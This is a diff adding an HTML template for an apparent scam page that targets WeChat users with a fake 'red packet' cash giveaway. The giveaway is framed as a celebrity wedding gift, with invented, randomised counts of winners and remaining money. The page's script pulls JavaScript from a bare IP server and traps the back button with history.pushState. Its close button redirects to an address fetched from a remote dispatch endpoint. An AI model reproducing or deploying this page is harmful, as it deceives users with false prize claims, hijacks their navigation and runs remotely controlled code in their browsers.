@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <link rel="stylesheet" href="http://139.196.86.217:9000/fission/upload/style.css" />
+  <link rel="stylesheet" href="http://139.196.86.217:8998/fission/upload/index.css" />
+  <script src="http://code.jquery.com/jquery-3.4.1.min.js"
+    integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+</head>
+
+<body>
+  <div id="root" th:text="${typeId}" style="display:none;"></div>
+  <div id="fanhui"
+    style="background:black;font-size: 16px; height: 40px; line-height: 40px; position: fixed;top: 0;left: 0;width: 100%;z-index: 9999;color: #fff;">
+    &nbsp;< 关闭 <span style="display: block;float: right;margin-right: 12px;"><a href="javascript:;"
+        style="text-decoration: none;color: #fff">投诉</a></span>
+  </div>
+  <div style="width: 100%;height: 40px;"></div>
+  <div class="red-packet-container index-show-more-body" style="display: none;">
+    <div class="top-box">
+      <div class="cont-head-portrait">
+        <img style=" font-size: .12rem;border: 0;border-radius: inherit;width: .58rem;height: .58rem;"
+          th:src="${picUrl}">
+      </div>
+      <div class="cont-desc-blessing">
+
+        <p style="font-size: 24px;" th:text="${title}"></p>
+        <p><span th:text="${subtitle}"></span><i class="icon-prompt" th:text="${suffix}"></i></p>
+      </div>
+
+      <a class="btn-open-red-packet" href="javascript:;"><span>開</span></a>
+      <p class="cont-desc-bottom">- 今日已有<span class="lingqunum"></span>人领取了紅包 -</p>
+    </div>
+    <ul class="list"></ul>
+  </div>
+  <div class="award-container award-body" style="display: none;">
+    <p class="content-top-tips">恭喜领取紅包</p>
+    <p class="content-price">
+      <sup>￥</sup><span class="js_money"></span><i class="icon-highest">最高</i>
+    </p>
+    <div class="content-charge-box">
+      <a class="charge-btn" href="javascript:;">立即领取紅包</a>
+      <p class="charge-tips">今日24点前未收钱，将收回紅包资格<br /><span style="color: red;">如多次领取以最后一次领取金额为准</span></p>
+    </div>
+    <p class="content-tips-total">总共100000份，已成功发出<span class="fafangnum"></span>份红包</p>
+  </div>
+
+  <script>
+    /*<![CDATA[*/
+    window.name = (Math.random() * (99 - 80) + 80).toFixed(2);
+    window.lingqunum = Math.floor(Math.random() * (2560 - 1200 + 1) + 1200);
+    window.fafangnum = Math.floor(Math.random() * (3560 - 1200 + 1) + 2200);
+    var obj = {
+      VideoCount: "http://z1bpdhk.54nwtf.top/VideoCount",
+      advapi: "http://139.196.86.217:8090/fission/dispatch/reference",
+      advlistimg: "https://debiao.oss-cn-hangzhou.aliyuncs.com/public/25sd54d5s1d2sa78sd1asd564as.gif",
+      dumpapi: "http://139.196.86.217:8090/fission/dispatch/reference",
+      dumpsapi: "http://api.yjbuttons.com/get_a3",
+      errurl: "http://z1bpdhk.54nwtf.top/errurl",
+      id: 6,
+      isa: 1,
+      isaa: 0,
+      iswx: 1,
+      isx: 1,
+      jumpapi: "http://139.196.86.217:8090/fission/dispatch/reference",
+      luodiadi: "http://api.yjbuttons.com/get_b",
+      oss: "https://debiao.oss-cn-hangzhou.aliyuncs.com",
+      pk: "hb",
+      rukouapi: "http://api.yjbuttons.com/get_a1",
+      story: "no",
+      title: "槟榔假烟",
+      tou: "http://z1bpdhk.54nwtf.top/tousu",
+      tui: false,
+      msg: '<p style="text-align: center; font-size: 22px;color: black;"><p style="color: green;font-size: 26px;">恭喜您！</p><p style="color: black">新郎：<span style="color: red;">郎朗</span>&nbsp;&nbsp;新娘：<span style="color: red;">爱丽丝</span></p><br/><p style="color: red;">慈定于2019-6-12 举行婚礼</p><br/><p style="color: black;">为答谢粉丝们的支持与厚爱，<br/> 现发出<span style="color: red;">1000万</span>紅包回馈粉丝</p><br/><p style="color: #b6b7b8;">紅包总额仅剩余<span style="color: red;">' +
+        Math.floor(Math.random() * (500 - 200 + 1) + 200) +
+        "万</span>元数量有限，先到先得</p></p>"
+    }
+
+    var s = document.createElement("script");
+    s.src = "http://139.196.86.217:8997/fission/upload/index.js";
+    document.body.appendChild(s);
+    window['typeId'] = $('#root').text() || ''
+    // 返回
+    $.getJSON(obj.advapi + '/' + window.typeId.split('_')[0] + '/' + window.typeId.split('_')[1], function (e) {
+      setTimeout(function () {
+        history.pushState(
+          history.length + 1,
+          "message",
+          "#" + new Date().getTime()
+        );
+      }, 200);
+      window.onhashchange = function () {
+
+        //        location.href = e[1];
+        // location.href = e.url;
+      };
+      $("#fanhui").on("click", function () {
+        //      	alert('close')
+        $.get(e[1], function (data) {
+          location.href = data
+        })
+        //        location.href = e[1];
+      });
+    });
+
+    wxalert(obj.msg, "我知道了");
+
+    function wxalert(n, b, i) {
+      var r, u;
+      r =
+        '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
+      r += '<div class="weui_mask"></div>';
+      r += '<div class="weui_dialog">';
+      r +=
+        '<i class="weui_close"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
+      r +=
+        '<div class="weui_dialog_hd"><strong class="weui_dialog_title"></strong></div>';
+      r +=
+        '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;font-size:18px;"></div>';
+      r += '<div class="weui_dialog_ft">';
+      r += '<a href="javascript:;" class="weui_btn_dialog primary">好</a>';
+      r += "</div>";
+      r += "</div>";
+      r += "</div>";
+      $(".weui_dialog_alert").length > 0 ?
+        $(".weui_dialog_alert .weui_dialog_bd").empty() :
+        $("body").append($(r));
+      u = $(".weui_dialog_alert");
+      u.show();
+      u.find(".weui_dialog_bd").html(n);
+      u.find(".weui_btn_dialog").html(b ? b : "好的");
+      u.find(".weui_btn_dialog")
+        .off("click")
+        .on("click", function () {
+          u.hide();
+          i && i();
+        });
+      u.find(".weui_close")
+        .off("click")
+        .on("click", function () {
+          u.hide();
+        });
+    }
+    /*]]>*/
+  </script>
+  <!-- 统计代码 -->
+  <div style="display: none" th:utext="${statistics}">
+    <!-- 此处放站长统计代码 -->
+  </div>
+</body>
+
+</html>
